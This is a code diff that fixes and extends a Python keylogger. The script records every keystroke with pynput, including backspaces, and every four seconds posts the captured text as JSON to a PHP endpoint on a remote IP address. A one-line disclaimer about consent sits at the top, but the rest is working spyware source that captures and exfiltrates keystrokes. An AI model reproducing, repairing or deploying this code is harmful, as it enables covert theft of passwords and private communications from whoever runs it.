@@ -1,18 +1,21 @@
+# Keyloggers can be a serious privacy concern and are illegal if used without explicit consent. Ensure you use such scripts only in legal and ethical scenarios.
+
+
 from pynput import keyboard
 import requests
 import json
 import threading
 
-
 text = ""
 
-ip_address = "10.0.2.15"
-port = 8888
+ip_address = "192.168.0.111"
+port = "80"
 
-time_interval = 10
-
+time_interval = 4
 
 def key_press(key):
+    global text
+
     if key == keyboard.Key.enter:
         text += "\n"
     elif key == keyboard.Key.tab:
@@ -21,6 +24,8 @@ def key_press(key):
         text += " "
     elif key == keyboard.Key.shift:
         pass
+    elif key == keyboard.Key.backspace:
+        text += "[backSpace]"
     elif key == keyboard.Key.shift and len(text) == 0:
         pass
     elif key == keyboard.Key.shift and len(text) > 0:
@@ -28,18 +33,28 @@ def key_press(key):
     elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         pass
     elif key == keyboard.Key.esc:
-        return
+        return False
     else:
-        text += str(key).strip("'")
+        text += str(key).strip(" ")
+
 
 def send_post_req():
+    global text
     try:
-        payload = json.dumps({"keyboardData" : text})
-        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
+        if text:  # Check if the list is not empty
+            payload = json.dumps({"keyboardData": text})
+            response = requests.post(f"http://{ip_address}:{port}/receive_post.php", data=payload, headers={"Content-Type": "application/json"})
+            text = ""
+
         timer = threading.Timer(time_interval, send_post_req)
         timer.start()
-    except:
-        print("Couldn't complete request!")
+    
+    except requests.RequestException as e:
+        print(f"Request error: {e}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+
 
 with keyboard.Listener(on_press=key_press) as listener:
     send_post_req()
